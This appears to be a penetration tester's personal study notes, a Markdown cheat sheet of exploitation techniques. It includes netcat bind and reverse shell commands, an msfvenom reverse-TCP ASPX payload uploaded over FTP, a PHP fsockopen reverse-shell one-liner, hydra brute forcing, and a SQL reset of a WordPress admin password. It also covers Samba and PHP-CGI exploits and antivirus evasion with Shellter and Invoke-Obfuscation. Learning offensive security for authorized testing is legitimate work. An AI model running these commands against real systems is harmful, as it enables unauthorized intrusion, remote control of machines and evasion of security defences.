# Exploit

Methodology:
- Identify vuln service
- Identify and prepare exploit code
- Gain access, both automated and manual
- Obtain remote access on target system.
- Bypass AV detection
- Pivot on the other target

[Mitre att&ck](https://attack.mitre.org/)

## Banner grabbing (Get service and their version)

- nmap have a script call `banner.nse` for simple banner collecting
- We can use `nc` `nc <target_id> <port_id>`

We can looking for exploit online in:
- exploit db
- rapid7.com
- github
- packet storm

## Searchsploit

Exploit db offline in: `/usr/share/exploitdb/exploits`
- We can copy the code of exploit on the db online and search in this folder 

Searchsploit:
- `-m <exploit_id>` exploit code, copy to current folder.
- `searchsploit -w vsftpd` display the Exploit-db URL 
- `-u` for update the exploit database
- `-t` keyword title
  - `-e` exact search

To using script from searchsploit, you need to read instruction carefully and change the params or code, or additional session to be able to run.

## Cross-Compling

Compling code for other OS, Usually from kali to Windows

- Install `sudo apt install mingw-w64` and `gcc`
- Complie `i686-w64-mingw32-gcc <source> -o <des>`
  - For 32 bit `-lws2_32`

We can use online binary resource in [EDB Bin exploit](https://gitlab.com/exploit-database/exploitdb-bin-sploits)

## Netcat

AKA: TCP/IP swiss army knife. Networking utility used to read and write data to network connections using TCP or UDP
- Client mode: Use nc to connect to other target
- Server mode: Use to listen for connections

We use nc for:
- Banner Grabbing 
- Port scanning 
- Transfer file
- Bind/Reverse shell

Pre-complie for windows in `/usr/share/windows-binaries`

Options:
- `-u` Use UDP instead of TCP
- `-n` Disable resolve hostname via DNS
- `-v` Verbose
- `-e` Execute a specific command
- To connect to port: `nc -n -v <target> <port>`, for UDP `nc -nvu <target> <port>`
- To listening `nc -nvlp <port>`, for udp `-nvlup`
- To transfer file
  - For listener `nc -nvlp 1234 > test.txt`
  - For client `nc -nv <target> <port> < test.txt`

**Bind shell**

Is a type of remote shell where the attacker connect directly to a listener on the target system.

**How to setup**:

Window to linux
- On listener `nc -nvlp 1234 -c /bin/bash`
- On client `nc -nv <target> <port>`

Linux to Windows:
- On listener `nc -nvlp -e cmd.exe`

**Reverse shells**

Is a type of remote shell where target connect directly to the listener on the attacker's system

Better in bind shell for:
- Don't need to setup listener on target, avoid firewall
- Better interaction with the system

Cons:
- Will leak the attacker IP if be found out

How to setup: 
- Setup listener on attacker machine: `nc -nvlp 1234`
- On target `nc -nv <attacker_ip> <port> -e cmd.exe`
  - For linux `-c /bin/bash`

**Cheatsheet**:

[Payload all the thing](https://github.com/swisskyrepo/PayloadsAllTheThings)

[Reverse shell generate](https://www.revshells.com/)

---

Tips:
- The web app processmaker have default cred admin:admin, and the version 2.5 have exploit, we can use module `processmaker_exec` to exploit and gain access.

## Powershell empire 

Is a pure Powershell exploit/post exploit framework built on cryptological-secure communications and flexible architecture
- Usually for Windows
- Have encryptions for traffic

Starkiller is GUI frontend for the Powershell empire.

Setup:
- `sudo powershell-empire server`
- `sudo powershell-empire client`

---

- `listeners` List of listeners that u have
- `agents` List of exploit system that u have access to

Stalkiller
- Use cred: `empireadmin:password123`

# Backbox Pentest

Security assessment whereby the penetration tester is not provided with any informations regrading the target system or network.

## IIS FTP

Service FTP:
- Check if service can be login anonymouse
- Brute force with `msf` or `hydra`

If Service FTP pair with IIS:
- Generate asp payload with `msfvenom -p windows/shell/reverse_tcp LHOST=<Host_ip> LPORT=1234 -f asp > shell.aspx` 
- Upload it with ftp
- Setup `/multi/handler` -> setup payload and rhosts
- Try to run `http://<target>/shell.aspx`

## SMB

Typically, we perform scan and brute force to get user and passowrd, we can get the user list from other service and try to brute force password

After gain user and accout, we can:
- `enum4linux -u <user> -p <password> -U <target>` gain further info
- Connect with psexec by using script `/usr/share/doc/python3-impacket/example/psexec.py` or use module `smb/psexec` on msf

# Linux

## Vsftpd and smtp

When consider brute force for vsftpd, we can take a look at smtp, because enum user for smtp is easier and it can narrow down the scope of user for us
- Open `msfconsole` `search smtp_enum`
- Set `rhosts` and run, set `unixonly true` bacause we target linux
- Get all account and save to new file, then perform brute force on `vsftpd` by using `hydra`
- After gain access, we can perform enumuration. Or If apache php open, we can upload the php shell script `usr/share/webshells/php/php-reverse-shell.php`

## Php

We can lookup the config file `phpconfig.php`

PHP 5.5 vulns with cgi. -> We can use the python exploit script (id: 18836)
- Run with `python 18836.py <target> <port>`
  - We can change the `pwn code` to execute the command that we want (php code)
  - Use php oneline code to connect `$sock=fsockopen("<target>",<port>);system("sh <&3 >&3 2>&3");`

MSF:
- `searchsploit php cgi` `use exploit/multi/http/php_cgi_arg_injection`
- Set rhost and run

## Mysql with wp

- After we gain connect with mysql, we may see the `wordpress` database
- `use wordpress;` -> `show tables;` -> `select * from wp_users;`
  - `UPDATE wp_users SET user_pass = MD5('password123') WHERE user_login = 'admin';` Set new password for admin
  - We can go the wordpress admin login page and try using new cred. `/wordpress/wp-login.php`

## Samba

Samba 3.0.20 have vulns call usermap `searchsploit samba 3.0.20`

We can use module `usermap_script` to exploit

# Obfuscations

AV detection method:
- Signature base.
- Heuristic-based detection: Check for rules and specific pattern.
- Behavior based detections: Monitoring behavior

## AV evasion

Technique:
- On-disk evasion:
  - Obfuscation: Reooganizes, abuse syntax, marco in order to make it harder to analyze or RE (reverse engineer)
  - Encoding: Change data into a new format using a scheme. -> Reversible process.
  - Packing: Generate execute with new binary structure with a smaller size
  - Crypters: Encrypts code or payload.
- In memory evasion
  - Inject payload into a process via some Windows API

`Shellter` is a dynamic shellcode injection tool. Use to inject shellcode into native windows applications.
- `sudo apt install shellter` 
- `sudo dpkg --add-architecture i386`
- `sudo apt install wine32`
- `wine /usr/share/windows-resources/shellter/shellter.exe`
- Download some installer as base exe
- `A` Auto create -> Set base exe -> Stealth mode? -> Payload -> Save and ship it.

## Powershell

[Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation:w)

We can use powershell package on debian.
- Start powershell on kali-> go to repo folder
- `Import-module ./Invoke-Obfuscation.psd1`
- Now command invoke, we can use `Invoke-Obfuscation` -> `SET SCRIPTPATH` ->  `ENCODING`
- Or `AST` -> `ALL` to obfuscation code.